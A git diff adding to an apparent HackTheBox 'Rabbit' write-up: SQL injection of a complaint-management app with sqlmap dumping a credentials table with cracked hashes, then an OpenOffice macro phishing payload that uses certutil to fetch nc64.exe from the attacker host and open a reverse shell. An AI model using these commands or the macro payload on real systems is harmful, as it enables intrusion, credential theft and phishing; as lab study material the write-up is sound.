@@ -346,10 +346,185 @@ by Ben "epi" Risher 🤓                 ver: 2.10.0
 
 ```
 
-## Foothold
+- http://10.10.10.71:8080/joomla/
+
+![](./images/5.png)
+
+- http://10.10.10.71:8080/complain/
+
+![](./images/4.png)
+
+## Foothold/User
+- `joomla` version `3.6`
+```
+└─$ curl -s http://10.10.10.71:8080/joomla/administrator/manifests/files/joomla.xml | xmllint --format - 
+<?xml version="1.0" encoding="UTF-8"?>
+<extension version="3.6" type="file" method="upgrade">
+  <name>files_joomla</name>
+  <author>Joomla! Project</author>
+  <authorEmail>admin@joomla.org</authorEmail>
+  <authorUrl>www.joomla.org</authorUrl>
+  <copyright>(C) 2005 - 2017 Open Source Matters. All rights reserved</copyright>
+  <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
+  <version>3.8.1</version>
+  <creationDate>October 2017</creationDate>
+  <description>FILES_JOOMLA_XML_DESCRIPTION</description>
+  <scriptfile>administrator/components/com_admin/script.php</scriptfile>
+...
+```
+
+- `complain management system`
+  - Register a user
+  - Nothing interesting inside
+
+![](./images/6.png)
+
+![](./images/7.png)
+
+- `searchsploit`
+```
+┌──(kali㉿kali)-[~]
+└─$ searchsploit complain
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Complain Management System - Hard-Coded Credentials / Blind SQL injection                                                                                                                                 | php/webapps/42968.txt
+Complain Management System - SQL injection                                                                                                                                                                | php/webapps/41131.txt
+Complaint Management System 1.0 - 'cid' SQL Injection                                                                                                                                                     | php/webapps/48758.txt
+Complaint Management System 1.0 - 'username' SQL Injection                                                                                                                                                | php/webapps/48468.py
+Complaint Management System 1.0 - Authentication Bypass                                                                                                                                                   | php/webapps/48452.txt
+Complaint Management System 4.0 - 'cid' SQL injection                                                                                                                                                     | php/webapps/47847.txt
+Complaint Management System 4.0 - Remote Code Execution                                                                                                                                                   | php/webapps/47884.py
+Complaint Management System 4.2 - Authentication Bypass                                                                                                                                                   | php/webapps/48371.txt
+Complaint Management System 4.2 - Cross-Site Request Forgery (Delete User)                                                                                                                                | php/webapps/48372.txt
+Complaint Management System 4.2 - Persistent Cross-Site Scripting                                                                                                                                         | php/webapps/48370.txt
+Complaints Report Management System 1.0 - 'username' SQL Injection / Remote Code Execution                                                                                                                | php/webapps/48985.txt
+Consumer Complaints Clone Script 1.0 - 'id' SQL Injection  
+```
+
+- The `42968.txt` has a `SQL` injection part
+  - Let's test http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans
+
+![](./images/8.png)
+
+- Replacing `plans` with `'` issues error
+  - Moreover `UNION` injection works (with 5 columns)
+
+![](./images/9.png)
+
+![](./images/10.png)
+
+- Let's use `sqlmap`
+```
+─$ sqlmap -r sqli.req --batch --level 5 --risk 3 -p id --technique U 
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.7.8#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:23:15 /2023-09-25/
+
+...
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: mod=admin&view=repod&id=plans UNION ALL SELECT NULL,NULL,CONCAT(0x716a766271,0x635244734b61576c59584848796547614150576544425746664d5475534c6d48776d796f57706e46,0x7178717671),NULL,NULL-- -
+---
+[18:23:38] [INFO] testing MySQL
+[18:23:39] [INFO] confirming MySQL
+[18:23:39] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.4.27, PHP 5.6.31
+back-end DBMS: MySQL >= 5.0.0
+[18:23:41] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.10.71'
+
+[*] ending @ 18:23:41 /2023-09-25/
+
+```
+
+- Let's enumerate
+```
+└─$ sqlmap -r sqli.req --batch --level 5 --risk 3 -p id --technique U --dbs
+...
+[18:24:08] [INFO] fetching database names
+available databases [7]:
+[*] complain
+[*] information_schema
+[*] joomla
+[*] mysql
+[*] performance_schema
+[*] secret
+[*] sys
+
+```
+```
+└─$ sqlmap -r sqli.req --batch --level 5 --risk 3 -p id --technique U -D secret --tables
+...
+[18:24:31] [INFO] fetching tables for database: 'secret'
+Database: secret
+[1 table]
++-------+
+| users |
++-------+
+```
+```
+└─$ sqlmap -r sqli.req --batch --level 5 --risk 3 -p id --technique U -D secret -T users --dump
+...
+Database: secret                                                                                                                                                                                                                           
+Table: users
+[10 entries]
++--------------------------------------------------+----------+
+| Password                                         | Username |
++--------------------------------------------------+----------+
+| 33903fbcc0b1046a09edfaa0a65e8f8c                 | Kain     |
+| 719da165a626b4cf23b626896c213b84                 | Raziel   |
+| b9c2538d92362e0e18e52d0ee9ca0c6f (pussycatdolls) | Ariel    |
+| d459f76a5eeeed0eca8ab4476c144ac4                 | Dimitri  |
+| 370fc3559c9f0bff80543f2e1151c537                 | Magnus   |
+| 13fa8abd10eed98d89fd6fc678afaf94                 | Zephon   |
+| d322dc36451587ea2994c84c9d9717a1                 | Turel    |
+| 33da7a40473c1637f1a2e142f4925194 (popcorn)       | Dumah    |
+| dea56e47f1c62c30b83b70eb281a6c39 (barcelona)     | Malek    |
+| a6f30815a43f38ec6de95b9a9d74da37 (santiago)      | Moebius  |
++--------------------------------------------------+----------+
+```
+
+![](./images/11.png)
+
+- We can login to `owa` as `Ariel`, `Kain`, `Magnus`
+  - `TPS Reports` - `Please send your weekly TPS reports to management ASAP!` 
+    - Possible phishing attack
+  - `Security updates` - `The security team has deployed windows defender and PowerShell constrain mode as the default organization security standard.`
+    - `Powershell` has [constrained language mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)
+  - `Updated software list` - `There has been a change in the allowed software. Help Desk has moved forward with deploying Open Office to everyone.`
+
+![](./images/12.png)
+
+- Let's create a `TPS report` with a macros inside
+  - First, we save a file as `odt`
+  - Then we click `Tools -> Macros -> Edit Macros`
+    - We will see our file (`tps_report.odt`) with `Standard` folder, which is empty
+    - We create a new macros by visiting `Tools -> Organize Macros -> Basic`, select `Standard` folder under the filename and click `New`
+  - Add the payload
+    - `shell("cmd /c certutil -urlcache -split -f http://10.10.16.9/nc64.exe C:\programdata\nc.exe && C:\programdata\nc.exe -e cmd 10.10.16.9 6666")`
 
 
-## User
+![](./images/13.png)
 
+![](./images/14.png)
 
-## Root
+- Then we have to associate our macros with an event
+  - Open `Tools -> Customize -> Events -> Open Document` 
+  - Select the macro we created
+
+![](./images/15.png)
+
+- Now, launch the listener and send the doc
+  - So, I had issues with this part and couldn't complete the task due to browser not supporting pop up windows from `Exchange 2010 OWA`
+  - Thus, check the [0xdf](https://0xdf.gitlab.io/2022/04/28/htb-rabbit.html#shell-as-raziel) for the writeup
